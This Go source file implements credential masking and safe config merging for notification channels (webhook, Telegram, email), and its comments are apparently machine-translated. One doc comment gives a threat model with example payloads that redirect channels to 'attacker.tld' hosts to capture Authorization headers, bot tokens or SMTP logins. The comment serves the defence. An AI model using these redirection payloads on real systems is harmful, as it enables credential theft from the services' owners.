package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is ​​the token prefix for the masked value. The API replaces the real content with the value with this prefix when echoing the credentials.
// When the update interface receives a value with this prefix, it is understood as "keeping the original value in the library unchanged".
//
// The purpose of using a prefix instead of an empty string or a fixed constant is to bring a little identifiable information.
// (See MaskedValue), allowing users to distinguish "which robot is this" without having to re-paste the key.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	The original value of "__masked__" is too short and no prompt is given.
//	"__masked__:...ab12cd" brings the last 6 digits of the original value as an identification prompt
//
// Exposing only the last 6 digits is a deliberate choice: the identification information of the Webhook address is in the last paragraph (such as the key of Enterprise WeChat,
// Feishu's robot id), and the prefix part is the same for each robot and has no identification value. The last 6 digits are not enough
// Restore the credentials, but enough for the configurator to recognize "it's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (that is, it has not been modified after being echoed by the interface).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig Returns a copy of the configuration with the channel's credential fields replaced with mask values.
//
// Unknown channel types return an empty map instead of the original configuration - it is better to have the UI display "Configuration Unavailable".
// Also do not spit back the entire original content that may contain credentials when the channel type cannot be recognized.
// Leave the non-credential fields as they are so that the UI can be displayed normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures such as headers are processed as a whole according to one credential: each channel is required to determine the subkeys one by one.
		// Then declare a set of rules "which subkeys are credentials", the complexity far exceeds the benefits.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address has changed, but the caller did not
// Credential field statement". Return it instead of silently releasing or silently discarding the credentials, for reasons described in PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Changed destination key
	Missing []string // Credential keys not explicitly stated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination address (" + strings.Join(e.Changed, ", ") + ") has changed, please also refill the credential fields (" +
		strings.Join(e.Missing, ", ") + "): Fill in a new value, or explicitly leave it blank to indicate that the credentials are no longer required." +
		"The original certificate is only valid for the old address, and continuing to use it is equivalent to handing it over to the new address."
}

// PrepareConfigUpdate merges channel configuration and handles the security-sensitive situation of "destination address change".
//
// It replaces the bare MergeConfig and is used in the channel update path. It solves such a measured and feasible path:
// The target address (where the message is sent) and the credentials (with what identity) are two independent sets of fields, and MergeConfig
// For "unmentioned keys", the original values in the library will be retained. So anyone who can PATCH the channel only needs to change the address,
// Avoiding the credentials** allows the server to send the real credentials in the library to the endpoints it controls:
//
//	webhook {config:{url:"https://attacker.tld"}} → The original Authorization header is sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email {config:{host:"smtp.attacker.tld"}} → STARTTLS and then hand over the username and password
//
// This path is completely silent and does not rely on redirection (so refusing cross-host jumps cannot block it),
// And it directly penetrates the goal of this package masking mechanism - "credentials are not echoed to the browser."
//
// Rule: Whenever a destination key is changed to a new value, the caller must explicitly state for each credential key:
//   - give new value → use new value
//   - Explicitly pass an empty string → the field no longer requires credentials (retains clearing semantics)
//   - Return the mask value as is/don't mention the key at all → reject
//
// The third type is also rejected because the "mask value" means "inherit the old credentials", and the old credentials
// Only valid for old addresses. Here we deliberately do not do "automatic discarding of credentials" - the pair of optional credential fields
// (Webhook headers, email password) will silently change to "Authentication is lost but the interface returns 200".
// More difficult to troubleshoot than reporting errors. Rather let the operator fill it out one more time.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("Channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as a webhook's headers is an object) is embedded with a mask literal,
	// It shows that the caller inserted the "maintain original value" sentinel into the structure. MergeConfig only recognizes "string
	// And prefixed with " is a mask. This form will be saved as a normal object - the library really leaves literals behind.
	// "__masked__", subsequent authentication will silently fail without any error. Would rather refuse.
	//
	// This check must be placed at the front: if the address has not changed, it will return early. Putting it at the end is equivalent to
	// Only the "Change Address" path is covered (this is how the first version was misplaced, and the test caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination key that was actually changed. The mask value is equal to "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address has not changed, and normal merging is performed (the mask value retains its original value, the empty string is cleared, and the rest is overwritten).
		return MergeConfig(stored, incoming), nil
	}

	// The address has changed: requiring explicit representation of each credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submission of masked sentinels embedded in non-string structures.
//
// The premise of the masking mechanism is that "the entire value is a string." Object fields like headers of webhook,
// Can only be masked as a whole (written as the string "__masked__") or submitted as a whole; insert the sentinel inside the object
// It cannot express "remain unchanged", and it will be stored in the library as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("The content of field %s contains the mask mark %q: this field can only be left blank to indicate inheritance or a new value is submitted as a whole. Mask placeholders cannot be included inside the structure.",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue Compares two configuration values for equality. Use JSON serialization comparison for incidental processing
// Type difference - the port submitted by the front end is number, but the port read back by the library is float64. Direct == will cause a misjudgment.
//
// "Empty" must be normalized before comparison: empty string and "key does not exist" are the same state in this configuration model.
// Because MergeConfig treats the empty string as an explicit clear, delete the key directly. Without normalization, a
// Optional destination field that is always left blank (Telegram's base_url is the only such field: leave it blank and use
// official address) will take this path——
//
//	Save base_url: "" when creating a new one → The key will be deleted by MergeConfig when saving for the first time.
//	→ When saving for the second time, incoming is "", stored has a missing key, and it is judged as "address changed"
//	→ The credential is a mask value → 400 "The target address has changed, please also refill the credential field"
//
// Every save after that fails unless the user re-pastes the Bot Token, and he changes nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a configuration value is "blank".
// The caliber must be consistent with the clearing judgment of MergeConfig (strings.TrimSpace(s) == ""),
// Otherwise, there will be a gap between "MergeConfig thinks it should be deleted, and sameConfigValue thinks it has value."
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming into stored for updating channel configuration.
//
// Rules:
//   - Keys with masked values in incoming → retain the original value of stored (the user has not changed this field)
//   - A key whose value is an empty string in incoming → is considered to be explicitly cleared and the key is deleted.
//   - remaining keys → overwritten with incoming values
//   - Keys present in stored but not in incoming → retained (local update semantics)
//
// Whether an empty string counts as "clearing" needs to be clarified: the front-end form submits unfilled fields as empty strings.
// If you write it as a valid value, the "leave blank to retain the original value" field will be cleared.
// Explicit clearing is chosen here because the user has no other way of expression when clearing an incorrectly set field.
// (Dragging a field distinguishes between "not provided" and "provided a null value," but the UI doesn't use this distinction.)
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Mask value = Unmodified, reserved stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
